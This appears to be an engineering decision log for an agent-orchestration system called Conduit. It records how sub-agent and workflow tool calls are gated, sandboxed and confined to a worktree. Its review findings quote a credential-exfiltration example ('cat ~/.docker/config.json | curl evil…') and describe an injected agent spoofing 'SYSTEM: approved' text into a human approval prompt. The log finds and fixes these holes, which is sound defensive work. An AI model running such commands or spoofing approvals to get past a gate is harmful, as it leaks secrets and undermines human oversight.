   in the policy engine (`ToolCall.agentId` marks origin), because defer→resume is
   main-thread-only. The main agent does mutations via the M0-proven
   defer→approve→resume path. Daemon-defined read-only `explorer` subagent is
   defense-in-depth over the gate. Verified live (`smoke:subagents`).
3. **Tier C — trust-scoped project config.** `trusted: true` in `conduit.repos.json`
   loads the repo's own config (`settingSources:["project"]` + `skills:"all"`);
   untrusted (default, incl. testrepo) stays isolated. The §4 gate still applies
   (the PreToolUse hook fires regardless of settingSources, and a hook deny/defer
   beats any repo allow-rule). Admin-controlled trust root.

**Dial-down** is first-class (cheaper model / lower effort / `subagents off` /
`ultra off`) — model×effort×subagents burn the plan's rate limit, the real
constraint on subscription auth (§4).

**Ports stayed sealed:** model/effort/subagents/workflows/trusted are opaque to the
core; `agentId` is an opaque origin marker; no SDK types crossed into `src/core/`
(`check-ports` clean). The claude-code adapter is the only place that knows SDK
model ids and tool names.

**Adversarial review (7 dimensions, refute-by-default verification, run as a
multi-agent Workflow).** 3 candidates, 2 confirmed and fixed (commit 74f42a0):
- **(policy)** A subagent-initiated **allowlisted** bash executed — the subagent
  branch only rewrote `gate`→`deny`, so an allowlisted command (e.g. the repo test
  command) returned `allow` and ran, breaking the read-only-subagent invariant.
  Fixed: subagents may run only genuine confined reads; allowlisted bash is denied.
- **(lifecycle)** A capability toggle during a turn's async harness-attach window
  could lose the prompt-cache invalidation (stale delegation guidance; tools/gate
  unaffected). Fixed with a race-free `promptKey` check in `getOrAttachHarness`.
- Refuted: config model/effort tokens are case-sensitive — fails safe (warning +
  fallback), documented lowercase; left as-is.

**Open question §9 #7 (model routing) — partially resolved:** *who* can change the
model/effort per thread is settled (the architect, via in-thread commands, audited).
A single model/effort applies per session; separate conversation-vs-implementation
model routing remains open (not needed for the demo).

**Demo (defines done):** a PM describes a feature in plain language; the session
(Opus, `ultra` on) plans it and fans out read-only exploration to subagents in
parallel; the main agent proposes edits; the architect approves the writes and the
land — all in Slack, on the throwaway `testrepo`. Build-time safety intact: writes
only on testrepo, land/deploy echo/no-ops, subagents/trusted opt-in default-off.

**New smokes:** `smoke:model`, `smoke:subagents`; spikes in `spikes/m3.5/`.

## 2026-07-18 — M3.5 follow-up: Workflow tool spiked and DISABLED (bypasses the gate)

**Why.** The `ultra` preset was specced as `xhigh` + subagents + the **Workflow**
tool (Claude Code's multi-agent orchestration; "ultracode" = xhigh + workflows).
Subagents were spiked and shipped, but the Workflow tool had NOT been exercised
end-to-end under Conduit's gate — so it got its own spike (`spikes/m3.5/
workflow-path.ts`, real adapter + real policy engine, subscription auth).

**SDK facts confirmed.** `enableWorkflows`/`disableWorkflows` live on the SDK
**`Settings`** interface (loaded via `settingSources`), NOT on query `Options`.
Conduit isolates with `settingSources: []`, yet the Workflow tool was still
*available* to the model (plan default / not disabled).

**Finding (the load-bearing one).** The Workflow tool ran, and the main agent's
`Workflow` spawn correctly hit our PreToolUse gate → allowed. **But the workflow's
orchestrated agents BYPASS our PreToolUse gate:** their tool calls carried no
`agent_id` and never reached our `GateFn` at all. They fell through to the
`canUseTool` blanket-deny backstop, which denied **everything** — the workflow's
Read *and* Write were both refused; nothing was written. So workflows are:
1. **Not gated in principle** — they route around the PreToolUse hook that is our
   security boundary (unlike the `Agent` tool's subagents, which DO carry
   `agent_id` and hit the gate — proven separately).
2. **Non-functional under our isolation** — the backstop denies even reads, so a
   launched workflow just fails (every sub-agent denied).

**Decision.** **Disable the Workflow tool for M3.5.** It is now in the adapter's
always-disallowed set (`BASE_DISALLOWED`), independent of any flag, with the spike
cited. `ultra` becomes **`xhigh` + subagents** (the gated, working read-only
fan-out); the "ultra on" label is derived state (subagents on AND xhigh effort), so
it always reflects the effective posture. The `workflows` plumbing (session column,
`HarnessTurnOptions.workflows`, `PolicyContext.workflowsEnabled`) is kept as a
**reserved seam** — no command sets it — for a future gated Workflow integration
(M4+, once workflow agents can be routed through the gate). This is exactly the
kind of DESIGN-vs-reality correction the spike-first rule exists to catch; DESIGN
§8 and CLAUDE.md updated. 170 tests, `tsc` + `check-ports` clean.

**For M4:** investigate whether the Workflow runtime exposes a permission hook for
its sub-agents (so their calls can be gated read-only like `Agent` subagents), or
whether it must stay off. Until then, subagents cover the parallel-fan-out use case.

## 2026-07-18 — M3.6 spike: secure workflows ARE gateable — the lever is `permissionMode`, not `canUseTool` (INVERTS the M3.5 finding)

**Why re-spiked.** M3.6 ("workflows in the thread") is premised on the M3.5 finding
that the Workflow tool's orchestrated agents BYPASS our PreToolUse gate (no
`agent_id`) and fall through to `canUseTool`. The kickoff plan was therefore "move
the confinement policy into `canUseTool`." Per the spike-first rule, I re-ran the
real Workflow tool on live subscription auth (same SDK 0.3.214) against the throwaway
testrepo BEFORE building. Scripts in `spikes/m3.6/` (`canusetool-confine.ts`,
`diag.ts`, `diag2.ts`, `diag3.ts`, `diag4.ts`).

**What the Workflow tool actually does.** The Workflow tool runs the WHOLE workflow
as a **background task** (`system:task_type: "local_workflow"`; the tool returns
"Workflow launched in background. Task ID …" immediately). The launching `query()`
generator does NOT end there — it streams the workflow's `task_progress`/
`task_notification` system events and yields a SECOND, FINAL `result` once the
workflow completes. So one `query()` call spans the entire workflow (good for our
one-turn model), but a workflow turn produces **multiple `result` messages** (an
intermediate "launched; waiting…" and the final synthesized one — the adapter must
deliver the LAST, not the first).

**The load-bearing finding — `permissionMode` decides whether the background
workflow's sub-agent tool calls reach our hook:**
- Under **`permissionMode: "default"`** (what M3.5's adapter used), the background
  workflow's sub-agent tool calls do NOT reach our PreToolUse hook OR `canUseTool`
  — they hit the SDK's background-task permission system, which with no interactive
  approver **default-DENIES** ("The user doesn't want to take this action right
  now"). That is why M3.5 saw workflows as ungateable + non-functional. (`diag.ts`:
  blanket-allow hook fired only once — for the `Workflow` launch — and the workflow
  agent's Read was denied by a source we don't control; `canUseTool` fired 0×.)
- Under **`permissionMode: "bypassPermissions"`**, the background workflow's
  sub-agent tool calls **DO route through our PreToolUse hook WITH `agent_id` set**
  (like an `Agent` subagent), and our hook's decision is authoritative.
  `bypassPermissions` here does NOT mean "un-gated" — it means "use the hook instead
  of interactive prompts." Hooks outrank permission mode in SDK precedence, so a hook
  `deny`/`defer` still wins. Proven end-to-end (`diag2`/`diag3`/`diag4`):
  1. **Secure read-only workflows work** (`diag3` A): a workflow agent's `Read`
     reached the hook (`sub(…) Read`) → allowed → returned the real file content
     (`# tiny-ledger`, functional); a workflow agent's in-tree `Write` reached the
     hook (`sub(…) Write`) → our `deny` was honored → no file written.
  2. **Main-agent gating is preserved** (`diag3` B): a main-agent `Write` under
     bypass still `defer`s — `terminal_reason: "tool_deferred"` with
     `deferred_tool_use` preserved, file NOT written. The M0 approve→resume loop is
     intact under bypass.
  3. **Worktree confinement is defence-in-depth** (`diag2`): even with a blanket-
     allow hook, the SDK's own worktree sandbox denied out-of-tree read/write
     (`/etc/hosts`, `../escape.txt`). So out-of-worktree access is denied by BOTH our
     hook and the SDK sandbox.
  4. **The `canUseTool` batching backstop still holds under bypass** (`diag4`): a
     hook `ask` fall-through reaches `canUseTool` (fired 1×) → our deny → write
     blocked; a forced batch of writes with hook `defer` produced a clean
     `tool_deferred` with zero files written. bypass does NOT auto-approve gated
     calls ahead of `canUseTool`.

**Decision (mechanism for M3.6).** Secure workflows are ACHIEVABLE — via
`permissionMode: "bypassPermissions"` + our EXISTING PreToolUse gate, NOT via a new
`canUseTool` confinement. When a session enables workflows: (a) set
`permissionMode: "bypassPermissions"` (only for workflow sessions; non-workflow
sessions stay `"default"`, unchanged), (b) drive reads through the hook
(`allowedTools: []` for workflow sessions — in `allowedTools`, reads are
"auto-approved before the callback is consulted" and for workflow sub-agents that
shadow path silently denies them), (c) re-enable the `Workflow` tool. The workflow's
sub-agent calls then hit the hook with `agent_id`, where the **M3.5 subagent policy
already confines them read-only** (reads allowed+confined; writes/bash/nested-spawns
denied). The main agent still mutates via defer→approve→resume. `canUseTool` stays as
the deny-by-default batching backstop (kept, still reachable under bypass), optionally
upgraded to the same confinement for defence-in-depth. This reuses the proven
subagent gating rather than inventing a canUseTool policy — simpler and safer than the
kickoff's plan, and it means Tier 3 (worktree-write opt-in) is just "let the subagent
branch allow confined WRITES when the architect opted in" (bash stays denied — it has
no worktree confinement; see the M3.6-complete review note below).

**Consequence for docs:** the M3.5 follow-up entry and CLAUDE.md say workflows are
disabled because they "bypass the PreToolUse gate." That was true ONLY under
`permissionMode: "default"`; it is corrected here. DESIGN §8 / CLAUDE.md updated as
M3.6 lands.

## 2026-07-18 — M3.6 complete: workflows working in the thread (gated + confined)

**Implementation (DESIGN.md §8 Milestone 3.6).** Three tiers, each independently
demoable; 201 tests green, `tsc` + `check-ports` clean; real-SDK `smoke:workflows`
(and `CONDUIT_SMOKE_WRITE=1`) plus the five M3.6 spikes.

1. **Tier 1 — secure read-only workflows.** The adapter re-enables the `Workflow`
   tool when a session turns workflows on, and switches that session to
   `permissionMode: "bypassPermissions"` so the background workflow's sub-agent
   tool calls route through the PreToolUse hook (agent_id-tagged), where the M3.5
   read-only subagent policy confines them. Reads move OUT of `allowedTools` for
   workflow sessions (onto the hook) so background sub-agents aren't shadow-denied.
   `canUseTool` is upgraded from a blanket deny to the core confinement policy for
   `escaped` calls (defence-in-depth; still denies batched gated writes). A workflow
   turn yields MULTIPLE results (intermediate "launched" then final synthesized), so
   the adapter buffers the last success and delivers only it. Command
   `@Conduit workflows on|off` (architect-only, implies subagents); `ultra` re-folds
   workflows.
2. **Tier 2 — running-workflow Slack UX.** The workflow LAUNCH is a gated action
   (policy returns gate + a `workflow-launch` concern), approved via the standard
   defer→approve→resume loop; the approval shows the workflow's name/description
   (`parseWorkflowMeta`) and a fan-out/budget concern. A live throttled status
   streams the background-task lifecycle (task_started/task_progress/…); the
   synthesized reply carries a `⚙︎ multi-agent workflow · $X` cost footer. The turn
   watchdog resets on every streamed message; concurrency is unchanged (one workflow
   turn holds one semaphore slot for its whole minutes-long duration — correct).
3. **Tier 3 — informed worktree-write opt-in.** `@Conduit workflows write on|off`
   (architect-only, default off) posts a mandatory, non-skippable warning and sets
   `PolicyContext.workflowWrite`, which lets confined subagent/workflow/escaped calls
   WRITE (confined to the worktree via `offendingPath`) without per-write approval;
   bash is NOT relaxed (see the review note), and out-of-worktree/credential/
   production-data stay hard-denied and land/deploy still gate. The write-mode leg is a POLICY concern (PolicyContext), not a harness-tool
   option, so it never touched HarnessTurnOptions. Invariant enforced in the store +
   manager: `workflow_write ⟹ workflows ⟹ subagents` (turning off a parent clears
   the children).

**Ports stayed sealed.** `ToolCall.escaped`, `HarnessTurnOptions.workflows`, and the
policy's `workflowWrite` are opaque/core; `permissionMode: "bypassPermissions"` is
named only in the adapter (the core sets `workflows: boolean`, the adapter maps it);
`check-ports` clean. The adapter imports the pure `parseWorkflowMeta` from core
(adapters may depend on core; core never depends on adapters).

**Known SDK limitation (documented; spikes/m3.6/diag5-grep.ts + the write smoke).**
A background workflow sub-agent gets a MINIMAL default toolset. Read/Glob route
through our gate and are confined reliably, but **Grep, Bash, and Write can be
denied by the SDK's task-permission layer UPSTREAM of our hook** ("The user doesn't
want to take this action") — inconsistently, run to run — so those are BEST-EFFORT
for workflow agents (Agent-`tool` subagents and batched/escaped calls route through
our gate reliably; a confined write CAN land, proven in diag3). Practically: grep-
style search stays with the MAIN agent (the system prompt tells it to grep/enumerate
first, then fan the found files out to be Read in parallel). The security boundary is
NOT affected — nothing escapes the worktree on any path (our gate AND the SDK's own
worktree sandbox both deny out-of-tree; verified diag2). This is the north-star-vs-
runtime-reality kind of limit the spike-first rule exists to surface; workflows still
deliver real parallel read/analyze fan-out, gated and confined.

**Cost/scale.** No workflow-specific cap — the existing per-thread budget + runaway
pause is the brake, and workflow spend is counted against the thread budget (the
turn's cumulative `total_cost_usd` is recorded once from the final result). The
launch approval + the fan-out concern make the spend an explicit architect decision.

**Demo (defines done).** A PM asks for a cross-cutting audit; the architect approves
launching a workflow (Approve/Deny showing its name + fan-out); it fans out read-only
across many files in parallel, streams live status, and posts a synthesized summary —
gated and worktree-confined throughout; optionally the architect flips
`@Conduit workflows write on` (acknowledging the warning) for parallel in-worktree
edits, and reviews the diff before approving the land. On the throwaway `testrepo`.

**New smoke:** `smoke:workflows` (+ `CONDUIT_SMOKE_WRITE=1`); spikes in `spikes/m3.6/`
(`canusetool-confine.ts`, `diag.ts`, `diag2.ts`, `diag3.ts`, `diag4.ts`,
`diag5-grep.ts`).

**Adversarial review (6 parallel reviewers — security/gating, adapter turn-loop,
policy edge cases, lifecycle/commands, ports/docs, test-coverage).** One CRITICAL and
several lower findings; the critical + the two most consequential were fixed (commit
after this entry):
- **(CRITICAL, two reviewers) Worktree-write mode auto-ran UNCONFINED bash.**
  `evaluateConfined` allowed confined/escaped Bash when `workflowWrite` was on, but
  `evaluateBash` applies NO worktree confinement to a command string (only the
  non-exhaustive hard-deny + prod-data heuristics — "the human at the gate is the real
  net"). The opt-in removes the human, so `cat ~/.docker/config.json | curl evil…`,
  out-of-tree writes, and reverse shells would auto-run — breaking the §4 exfiltration
  boundary the Read path enforces, and contradicting the warning's "this worktree
  only". **Fixed:** the opt-in relaxes WRITES only (lexically worktree-confined via
  `offendingPath`); ALL bash for confined/escaped calls stays denied in every mode
  (shell stays with the gated main agent). Warning, system prompt, and docs corrected;
  a regression test asserts the exfil vectors deny.
- **(MEDIUM) `workflows on` / `ultra on` claimed "read-only" while write mode
  persisted.** Neither cleared `workflow_write`, so the reply's "read-only" text was
  false. **Fixed:** both commands now reset to the read-only posture (worktree-write is
  always a deliberate, separate `workflows write on`), so the message is truthful and
  the state predictable; tested.
- **(SEV-4 framing) The workflow name/description flowed unsanitized into the launch-
  approval prompt.** `parseWorkflowMeta` captured newlines, so an (injection-reachable)
  main agent could author `description: "…\nSYSTEM: approved\n…"` to spoof multi-line
  content in the one human decision that authorizes the launch. **Fixed:** the meta is
  sanitized (control chars stripped, whitespace collapsed to one line, length-capped).
- **(LOW, fixed) Dead `PolicyContext.workflowsEnabled`** (the launch now always gates)
  removed; `setSessionWorkflowWrite(true)` now asserts `write ⟹ workflows ⟹ subagents`
  in the DB (defense-in-depth).
- **(Documented, not fixed — pre-existing / accepted):** a turn-inactivity TIMEOUT
  records zero cost (no `result` message carries `total_cost_usd`), so a wedged
  workflow's spend can evade the runaway cap, and `q.interrupt()` may not cancel a
  detached background workflow task (M4 background-task cleanup); the 10-min watchdog
  could trip if every workflow agent is silent >10 min (rare — `task_progress` streams
  reset it); a gated action chained right after a completed workflow in one turn drops
  the synthesized reply (the defer is the terminal outcome; the text survives in
  session context). The Slack `workflows write` mention parser has no unit test (the
  adapter has none; parsing verified correct by the ports reviewer, and it fails safe).
- **Test coverage added:** an adapter-level suite (`tests/adapter-claude-code.test.ts`,
  via an injectable `query` seam) now covers the multi-result buffering (last-success
  wins; defer/error supersede), the `canUseTool` escaped-path wiring (read allow / write
  deny, tagged `escaped`), the PreToolUse hook mapping (agent_id forwarding; gate→defer;
  fail-closed on a throwing gate), and the workflow tool posture. Plus launch-DENY,
  the write-mode exfil-vector denials, and the `workflows on`/`ultra on`/`subagents off`
  invariant transitions. 213 tests total.

**Verified NOT holes (by the reviewers, no change):** main-agent gating is not weakened
by `bypassPermissions` (single gated call defers; batched gated call → `canUseTool` →
deny — spike diag4); read-only default denies all writes/bash/network/spawns and even
allowlisted bash; `Write`/`Edit` are lexically worktree-confined even in write mode;
`escaped`/`agentId` are adapter-set (not model-spoofable) and `id:""` never collides
with an approval lookup; the launch gate can't be bypassed and nested spawns are denied;
`parseWorkflowMeta` is crash/ReDoS-safe; no port violations; docs match the code.

## 2026-07-18 — M3.6 key learnings & the `bypassPermissions` decision (read before touching workflows)

A consolidated, durable record of what M3.6 taught us — the non-obvious things a
future session (or an architect deciding whether to keep this) needs.

**1. The load-bearing decision: workflow sessions run under
`permissionMode: "bypassPermissions"`. This is NOT a security downgrade, and the
name is misleading.** In the Agent SDK, hooks outrank permission mode (precedence:
hooks → deny/ask rules → permission mode → allow rules → canUseTool). So our
PreToolUse hook's `deny`/`defer` still win under `bypassPermissions`; what the mode
actually changes is the *fallback* for a call the hook doesn't terminally decide —
from "ask the interactive user" (which, headless, DEFAULT-DENIES) to "proceed". We
set it ONLY for workflow-enabled sessions, and ONLY because the SDK runs a workflow
as a detached background task whose sub-agent tool calls otherwise never reach our
hook (they default-deny off-gate — that is the whole M3.5 "workflows bypass the gate"
mirage). Under `bypassPermissions` those same calls DO reach our hook with an
`agent_id`, where the read-only subagent policy confines them. Empirically proven,
not reasoned: `spikes/m3.6/diag3.ts` (hook `deny` on a workflow write is honored;
main-agent `defer` still pauses) and `diag4.ts` (the `canUseTool` batching backstop
is still reached and still denies). **This inverts the M3.5 conclusion and is an
architect-level call** — it is safe as built, but if the flag itself is unacceptable,
the only alternative found is to keep workflows disabled (there is no other mechanism
that makes the background workflow's agents both functional AND gateable). Do not
"harden" this by switching workflow sessions back to `permissionMode: "default"` —
that silently breaks workflows (agents default-deny) rather than making them safer.

**2. The SDK's Workflow execution model (why the toolset is limited).** The Workflow
tool launches the whole workflow as a *background task* (`system` subtype
`task_started`/`task_progress`/`background_tasks_changed`/`task_updated`), returns
"launched; waiting…" immediately, and the launching `query()` generator then streams
that task's lifecycle and yields a SECOND, FINAL `result` when it completes — so a
workflow turn produces MULTIPLE results (the adapter buffers and delivers the last).
Background workflow sub-agents get a MINIMAL default toolset: **Read/Glob route
through our hook and are confined reliably; Grep/Bash/Write are frequently denied by
the SDK's task-permission layer UPSTREAM of our hook** ("The user doesn't want to take
this action right now"), inconsistently run-to-run. So workflow agents are best used
for parallel READ/analyze fan-out; grep-style search and any shell stay with the main
agent (the system prompt says so). This is an SDK limitation we cannot override from
our gate — but it never widens the security boundary (nothing escapes the worktree on
any path; our gate AND the SDK's own worktree sandbox both deny out-of-tree).

**3. Bash cannot be worktree-confined by our policy, so it is never auto-runnable by
a confined/escaped call — not even in the worktree-write opt-in.** `evaluateBash`
screens only heuristics (hard-deny + prod-data); it applies NO path confinement to a
command string. The write opt-in relaxes WRITES only (which ARE lexically confined via
`offendingPath`). This was the CRITICAL review finding — do not "restore" confined
bash for convenience without first giving Bash real worktree confinement (reject
absolute/`..`/`~`/`$`/substitution/redirect targets) or a positive-parse allowlist.

**4. M4 watch-list (known, accepted for now):** (a) a turn-inactivity TIMEOUT records
zero cost — no `result` carries `total_cost_usd` — so a wedged workflow's spend can
evade the runaway cap; and `q.interrupt()` may not cancel the detached background
workflow, which could keep spending after the turn parks. Wire background-task cost
accounting + cancellation in M4. (b) The 10-min watchdog could trip if every workflow
agent is silent >10 min (rare; `task_progress` resets it). (c) The Slack adapter still
has no unit tests; the `workflows write` mention parse is verified-by-reading only
(fails safe). (d) Symlink-chasing confinement remains M3/M4 (writes are lexical-only).

**5. Process learning:** the spike-first rule paid for itself again — re-running the
real Workflow tool (not trusting the M3.5 write-up) is what surfaced the
`permissionMode` inversion. When a prior "it can't be done" blocks a north-star
capability, re-spike the primitive before accepting it.
